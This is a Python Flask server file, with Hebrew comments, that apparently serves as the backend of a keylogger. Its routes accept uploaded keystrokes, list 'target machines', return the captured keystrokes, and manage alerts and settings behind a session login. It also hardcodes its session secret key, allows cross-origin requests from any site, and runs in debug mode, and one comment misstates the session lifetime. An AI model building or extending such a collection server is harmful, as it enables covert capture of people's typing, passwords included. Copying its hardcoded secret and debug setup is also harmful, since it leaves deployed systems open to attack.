import os
from datetime import timedelta
from flask import Flask, render_template, request, send_from_directory, redirect, url_for, session
from flask_cors import CORS
from backend import controllers, services, utils

app = Flask(__name__, static_folder="../frontend", template_folder="../frontend")
CORS(app)
app.secret_key = "a9s8d7f6g5h4j3k2l1qwertyZXCVBNM"  # מפתח סודי לשמירת session
app.permanent_session_lifetime = timedelta(minutes=1)  # תוקף של 10 דקות

@app.get("/")
def home():
    return render_template('login.html')


@app.post("/api/login")
def login():
    return controllers.handle_login(request)

@app.post("/api/notifications")
def save_notifications():
    return controllers.handle_notifications(request)

@app.get("/api/get_notifications")
def get_notifications():
    return controllers.handle_get_notifications()

@app.post("/api/delete_notification")
def delete_notification():
    return controllers.handle_delete_notifications(request)

@app.get("/api/new_warning")
def new_warning():
    return controllers.handle_get_warnings()


@app.get("/api/get_warnings")
def get_warnings():
    return controllers.handle_get_warnings()

@app.post("/api/upload")
def post_keystrokes():
    return controllers.handle_keystrokes(request)

@app.get("/api/get_target_machines_list")
def get_machines():
    return controllers.handle_get_machines()

@app.get("/api/get_keystrokes")
def get_keystrokes():
    return controllers.handle_get_keystrokes(request)

@app.post("/api/update_settings")
def update_settings():
    return controllers.handle_update_settings(request)

@app.get("/api/get_settings")
def get_settings():
    return controllers.handle_get_settings()


@app.route("/home")
def home_page():
    if not session.get("user"):  # בדיקה אם המשתמש מחובר
        return redirect("/login")
    return render_template("index.html")

@app.route("/login")
def login_page():
    if session.get("user"):  # אם כבר מחובר, הפנה לדף הבית
        return redirect("/home")
    return render_template("login.html")

@app.post("/logout")
def api_logout():
    session.clear()  # מוחק את כל המידע מהסשן
    return {"success": True, "message": "Logged out"}

@app.route("/js/<path:filename>")
def send_js(filename):
    return send_from_directory("../frontend/js", filename)

@app.route("/style.css")
def send_css():
    return send_from_directory("../frontend", "style.css")

if __name__ == "__main__":
    app.run(debug=True, port=3000)